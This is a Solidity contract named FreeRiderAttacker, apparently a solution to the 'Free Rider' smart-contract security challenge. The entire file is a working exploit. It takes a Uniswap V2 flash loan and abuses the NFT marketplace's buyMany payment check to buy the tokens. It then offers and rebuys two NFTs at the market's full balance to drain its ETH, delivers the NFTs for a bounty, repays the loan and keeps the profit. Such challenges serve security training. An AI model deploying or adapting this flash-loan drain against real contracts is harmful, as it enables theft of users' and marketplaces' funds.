// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '@openzeppelin/contracts/token/ERC721/IERC721.sol';
import '@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol';
import '@openzeppelin/contracts/utils/Address.sol';
import './FreeRiderNFTMarketplace.sol';
import '../IWETH9.sol';

import 'hardhat/console.sol';

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

interface IUniswapV2Pair {
    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

/**
 * @title FreeRiderAttacker
 * @author jb
 */
contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
    using Address for address payable;

    address payable private _owner;
    IWETH9 private _weth;
    IUniswapV2Pair private _pair;
    FreeRiderNFTMarketplace private _market;
    bool private _wethIsToken0;

    uint256 _lock = 1;
    modifier nonReentrant() {
        require(_lock == 1, 'reentrancy');
        _lock = 2;
        _;
        _lock = 1;
    }

    constructor(
        IWETH9 weth,
        IUniswapV2Pair pair,
        FreeRiderNFTMarketplace market
    ) {
        _owner = payable(msg.sender);
        _weth = weth;
        _pair = pair;
        _market = market;

        if (_pair.token0() == address(weth)) {
            _wethIsToken0 = true;
        } else {
            // _wethIsToken is already false by default
            require(_pair.token1() == address(weth), 'bad pair');
        }
    }

    function calculateAmountWithFee(uint256 amount)
        public
        pure
        returns (uint256)
    {
        return ((amount * 1000) / 997) + 1; // round up
    }

    function attack(
        IERC721 nft,
        uint256[] calldata ids,
        uint256 price,
        uint256 loan,
        address client
    ) external payable nonReentrant {
        _attack(nft, ids, price, loan, client, msg.sender);
    }

    /// @dev poor MEV protection
    function _attack(
        IERC721 nft,
        uint256[] calldata ids,
        uint256 price,
        uint256 loan,
        address client,
        address user
    ) internal {
        // begin attack with flash loan, continue in callback
        uint256 repayAmount = calculateAmountWithFee(loan);
        _weth.transferFrom(user, address(this), repayAmount - loan);
        bytes memory data = abi.encode(nft, ids, price, client);
        if (_wethIsToken0) {
            _pair.swap(loan, 0, address(this), data);
        } else {
            _pair.swap(0, loan, address(this), data);
        }
    }

    function uniswapV2Call(
        address,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external override {
        assert(msg.sender == address(_pair));
        require(tx.origin == address(_owner), 'not owner');
        (IERC721 nft, uint256[] memory ids, uint256 price, address client) = abi
            .decode(data, (IERC721, uint256[], uint256, address));
        uint256 amount = _wethIsToken0 ? amount0 : amount1;

        // unwrap weth
        _weth.withdraw(amount);

        _purchase(ids, price);

        _extract(nft, ids);

        _ship(nft, ids, client);

        _repay(amount);

        _win();
    }

    // purchase NFTs, utilizing exploit
    function _purchase(uint256[] memory ids, uint256 price) internal {
        uint256 length = ids.length;
        for (uint256 i; i < length; ++i) {
            console.log('id: %s | price: %s', ids[i], price);
        }
        console.log('market balance: %s', address(_market).balance);
        _market.buyMany{value: price}(ids);
    }

    // extract remaining eth from marketplace
    function _extract(IERC721 nft, uint256[] memory ids) internal {
        require(ids.length >= 2, 'not enough NFTs');

        // approve market to transfer
        nft.approve(address(_market), ids[0]);
        nft.approve(address(_market), ids[1]);

        // offer two tokens at contract balance each
        uint256 marketBal = address(_market).balance;
        uint256[] memory prices = new uint256[](2);
        prices[0] = marketBal;
        prices[1] = marketBal;
        uint256[] memory targets = new uint256[](2);
        targets[0] = ids[0];
        targets[1] = ids[1];
        _market.offerMany(targets, prices);

        // buy them back with exploit
        _purchase(targets, marketBal);
    }

    // ship NFTs to client
    function _ship(
        IERC721 nft,
        uint256[] memory ids,
        address client
    ) internal {
        uint256 length = ids.length;
        uint256 userBalBefore = address(_owner).balance;
        for (uint256 i; i < length; ++i) {
            // ship each to client
            nft.safeTransferFrom(address(this), client, ids[i]);
        }
        require(
            address(_owner).balance - userBalBefore >= 45 ether,
            'no payment'
        );
    }

    function _repay(uint256 amount) internal {
        // wrap into weth
        _weth.deposit{value: amount}();

        uint256 amountToRepay = calculateAmountWithFee(amount);

        require(_weth.balanceOf(address(this)) >= amountToRepay, 'too poor');

        _weth.transfer(address(_pair), amountToRepay);
    }

    function _win() internal {
        uint256 wethBal = _weth.balanceOf(address(this));
        if (wethBal > 0) {
            _weth.withdraw(wethBal);
        }

        uint256 ethBal = address(this).balance;
        if (ethBal > 0) {
            _owner.sendValue(ethBal);
        }
    }

    receive() external payable {}

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
